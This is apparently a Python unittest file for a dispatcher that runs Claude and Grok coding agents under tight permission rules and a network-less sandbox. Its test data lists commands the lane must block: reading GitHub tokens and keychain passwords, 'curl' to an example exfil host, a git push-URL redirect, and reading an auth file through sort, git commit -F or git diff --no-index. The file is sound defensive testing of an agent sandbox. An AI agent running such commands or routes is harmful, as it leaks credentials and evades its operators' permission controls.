"""FRA-598: a lane não lê segredo nem publica.

Offline: não sobe Claude nem Grok, não fala com a rede. Lê o settings versionado
e o perfil de sandbox que o dispatcher grava antes do processo.
"""
import json
import tempfile
import unittest
from pathlib import Path

import sys

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lanes"))
import dispatcher as d


def _permite_ler_tudo(perms: dict) -> dict:
    """Allow global por cima das regras atuais: o deny de caminho ainda tem de ganhar."""
    copia = json.loads(json.dumps(perms))
    copia["allow"] = list(copia["allow"]) + ["Read", "Grep"]
    return copia


class PermissoesMinimasLane(unittest.TestCase):
    """Card que pede `cat ~/.config/gh/hosts.yml` e `security find-generic-password`."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.addCleanup(lambda: __import__("shutil").rmtree(self.tmp, ignore_errors=True))
        antigo = d.CONFIG_FILES
        self.addCleanup(setattr, d, "CONFIG_FILES", antigo)
        d.CONFIG_FILES = [self.tmp / "nao-existe.json"]

    def test_settings_sem_allow_global_nem_accept_edits(self):
        perms = d.lane_permissions()
        allow = perms["allow"]
        self.assertEqual(perms["defaultMode"], "dontAsk")
        for solto in ("Read", "Edit", "Write", "Grep", "Glob",
                      "Bash(python3:*)", "Bash(cat:*)", "Bash(security:*)"):
            self.assertNotIn(solto, allow, solto)
        self.assertIn("Read(./**)", allow)
        self.assertIn("Edit(./**)", allow)
        self.assertIn("Write(./**)", allow)
        for comando in ("git add", "git commit", "git status", "git diff"):
            self.assertIn(f"Bash({comando} *)", allow, comando)
            self.assertNotIn(f"Bash({comando}:*)", allow, comando)
        deny = perms["deny"]
        for regra in ("Bash(git difftool:*)", "Bash(git commit-tree:*)",
                      "Bash(git diff --no-index:*)", "Bash(git commit -F:*)",
                      "Bash(git commit --file:*)", "Bash(sort:*)",
                      "Bash(/usr/bin/sort:*)"):
            self.assertIn(regra, deny, regra)
        for ferramenta in ("Read", "Grep", "Edit", "Write"):
            self.assertIn(f"{ferramenta}(**/.grok/**)", deny, ferramenta)
            self.assertNotIn(f"{ferramenta}(~/.grok/**)", deny, ferramenta)
        self.assertNotIn("acceptEdits", json.dumps(d.lane_settings()))

    def test_cat_do_hosts_e_security_nao_passam(self):
        pedidos = [
            "cat ~/.config/gh/hosts.yml",
            "/bin/cat ~/.config/gh/hosts.yml",
            "security find-generic-password -s github -a franciel",
            "/usr/bin/security find-generic-password -s github",
            "python3 -c 'import subprocess; subprocess.check_call([\"security\", \"find-generic-password\"])'",
            "/usr/bin/python3 -c 'print(1)'",
            "env python3 -c 'print(1)'",
            "git status && security find-generic-password -s github",
            "git push",
            "gh auth token",
            "curl https://example.invalid/exfil",
            "git config remote.origin.pushurl https://example.invalid/exfil",
            "git difftool --extcmd id",
            "git commit-tree HEAD",
            "sort ~/.grok/auth.json",
            "/usr/bin/sort ~/.grok/auth.json",
            "git commit -F ~/.grok/auth.json",
            "git commit --file ~/.grok/auth.json",
            "git diff --no-index ~/.grok/auth.json /dev/null",
        ]
        for cmd in pedidos:
            with self.subTest(cmd=cmd):
                self.assertTrue(d.comando_negado_pela_lane(cmd), cmd)
        for cmd in ("git status", "git diff", "git diff --stat",
                    "git add lanes/dispatcher.py", "git commit -m ajuste"):
            with self.subTest(cmd=cmd):
                self.assertFalse(d.comando_negado_pela_lane(cmd), cmd)

    def test_leitura_de_segredo_continua_negada_mesmo_com_read_global(self):
        perms = _permite_ler_tudo(d.lane_permissions())
        for caminho in ("~/.config/gh/hosts.yml", "/Users/x/.config/gh/hosts.yml",
                        "~/.ssh/id_rsa", "~/.transcentia/lanes/claude-settings.json",
                        "~/.grok/auth.json", "/Users/x/.grok/auth.json"):
            with self.subTest(caminho=caminho):
                self.assertTrue(d.leitura_negada(caminho, perms), caminho)
        self.assertFalse(d.leitura_negada("lanes/dispatcher.py"))
        self.assertFalse(d.leitura_negada("./lanes/claude-settings.json"))
        self.assertTrue(d.escrita_negada(".git/config"))
        self.assertTrue(d.escrita_negada(".git/hooks/pre-push"))
        self.assertTrue(d.escrita_negada("~/.grok/auth.json"))
        self.assertTrue(d.escrita_negada("/Users/x/.grok/auth.json"))
        self.assertFalse(d.escrita_negada("lanes/dispatcher.py"))

    def test_rede_e_security_no_sandbox_do_processo(self):
        sandbox = d.lane_settings()["sandbox"]
        self.assertTrue(sandbox["enabled"])
        self.assertTrue(sandbox["failIfUnavailable"])
        self.assertFalse(sandbox["allowUnsandboxedCommands"])
        self.assertFalse(sandbox["autoAllowBashIfSandboxed"])
        self.assertEqual(sandbox["excludedCommands"], [])
        self.assertEqual(sandbox["network"]["allowedDomains"], [])
        self.assertIn("*", sandbox["network"]["deniedDomains"])
        self.assertTrue(sandbox["network"]["strictAllowlist"])
        self.assertFalse(sandbox["network"]["allowLocalBinding"])
        deny_read = sandbox["filesystem"]["denyRead"]
        for caminho in ("~/.ssh", "~/.config/gh", "~/.transcentia", "~/.grok",
                        "/usr/bin/security"):
            self.assertIn(caminho, deny_read, caminho)
        self.assertIn(".git/config", sandbox["filesystem"]["denyWrite"])
        self.assertIn(".git/hooks", sandbox["filesystem"]["denyWrite"])
        self.assertIn('extends = "strict"', d.PERFIL_SANDBOX_TOML)
        self.assertIn("restrict_network = true", d.PERFIL_SANDBOX_TOML)
        self.assertIn('"~/.config/gh"', d.PERFIL_SANDBOX_TOML)
        self.assertIn('"/usr/bin/security"', d.PERFIL_SANDBOX_TOML)
        self.assertNotIn("auth.json", d.PERFIL_SANDBOX_TOML)

    def test_comando_nao_usa_accept_edits_e_aponta_o_settings_do_repo(self):
        claude = d.agent_command("claude", "medio")
        grok = d.agent_command("grok", "medio")
        self.assertEqual(claude[claude.index("--permission-mode") + 1], "dontAsk")
        self.assertEqual(grok[grok.index("--permission-mode") + 1], "dontAsk")
        self.assertNotIn("acceptEdits", claude)
        self.assertNotIn("acceptEdits", grok)
        settings = Path(claude[claude.index("--settings") + 1])
        self.assertEqual(settings, Path(d.__file__).resolve().parent / "claude-settings.json")
        self.assertEqual(grok[grok.index("--sandbox") + 1], "lane")
        allows = [grok[i + 1] for i, flag in enumerate(grok) if flag == "--allow"]
        for solto in ("Read", "Grep", "Bash(python3:*)", "Bash(cat:*)"):
            self.assertNotIn(solto, allows, solto)
        self.assertIn("Bash(git status *)", allows)
        self.assertNotIn("Bash(git status:*)", allows)
        denies = [grok[i + 1] for i, flag in enumerate(grok) if flag == "--deny"]
        self.assertIn("Bash(security:*)", denies)
        self.assertIn("Bash(/usr/bin/security:*)", denies)
        self.assertIn("Bash(git difftool:*)", denies)
        self.assertIn("Bash(git commit-tree:*)", denies)
        self.assertIn("Read(**/.grok/**)", denies)
        self.assertNotIn("monitor", grok[grok.index("--tools") + 1].split(","))

    def test_perfil_de_sandbox_nao_apaga_os_outros(self):
        arq = self.tmp / "sandbox.toml"
        arq.write_text('[profiles.outro]\nextends = "workspace"\n', encoding="utf-8")
        d.escrever_perfil_sandbox(arq)
        texto = arq.read_text(encoding="utf-8")
        self.assertIn("[profiles.outro]", texto)
        self.assertIn("[profiles.lane]", texto)
        self.assertIn('"/usr/bin/security"', texto)
        d.escrever_perfil_sandbox(arq)
        self.assertEqual(texto, arq.read_text(encoding="utf-8"))

    def test_prefixo_estrela_do_cli_nao_tem_fronteira(self):
        """`:*` é prefixo cru no CLI; ` *` exige o espaço. O teste usa essa regra."""
        cru = {"defaultMode": "dontAsk", "allow": ["Bash(git add:*)"], "deny": []}
        self.assertFalse(d.comando_negado_pela_lane("git addtool foo", cru))
        espaco = {"defaultMode": "dontAsk", "allow": ["Bash(git add *)"], "deny": []}
        self.assertTrue(d.comando_negado_pela_lane("git addtool foo", espaco))
        self.assertFalse(d.comando_negado_pela_lane("git add", espaco))
        self.assertFalse(d.comando_negado_pela_lane("git add lanes/dispatcher.py", espaco))
        diff_cru = {"defaultMode": "dontAsk", "allow": ["Bash(git diff:*)"], "deny": []}
        self.assertFalse(d.comando_negado_pela_lane("git difftool --extcmd id", diff_cru))
        commit_cru = {"defaultMode": "dontAsk", "allow": ["Bash(git commit:*)"], "deny": []}
        self.assertFalse(d.comando_negado_pela_lane("git commit-tree HEAD", commit_cru))

    def test_prompt_da_lane_grok_so_lista_os_quatro_git(self):
        texto = (Path(d.__file__).resolve().parent / "lane-prompt-grok.md").read_text(encoding="utf-8")
        self.assertNotIn("python3", texto)
        self.assertNotIn("`cat`", texto)
        for cmd in ("git status", "git diff", "git add", "git commit"):
            self.assertIn(cmd, texto, cmd)


if __name__ == "__main__":
    unittest.main()
